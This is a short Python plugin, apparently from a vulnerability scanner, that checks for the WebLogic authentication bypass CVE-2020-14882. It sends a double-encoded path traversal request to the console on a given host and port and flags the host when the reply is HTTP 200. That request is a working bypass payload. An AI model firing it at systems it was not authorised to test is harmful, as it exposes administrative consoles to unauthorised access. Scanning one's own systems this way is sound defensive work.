#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2020-14882
# updated 2020/11/27
# by 0xn0ne
import requests

from stars import universe, Star, target_type
from utils import http


@universe.groups()
class CVE_2020_14882(Star):
    info = {
        'NAME': 'webLogic bypass authentication',
        'CVE': 'CVE-2020-14882',
        'TAG': []
    }
    type = target_type.VULNERABILITY

    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
        sess = requests.session()
        http('http://{}:{}/console/css/%252e%252e%252fconsole.portal'.format(dip, dport), ssl=force_ssl, session=sess)
        r, data = http('http://{}:{}/console/css/%252e%252e%252fconsole.portal'.format(dip, dport), ssl=force_ssl, session=sess)

        if r and r.status_code == 200:
            return True, {'url': r.url}
        return False, {}
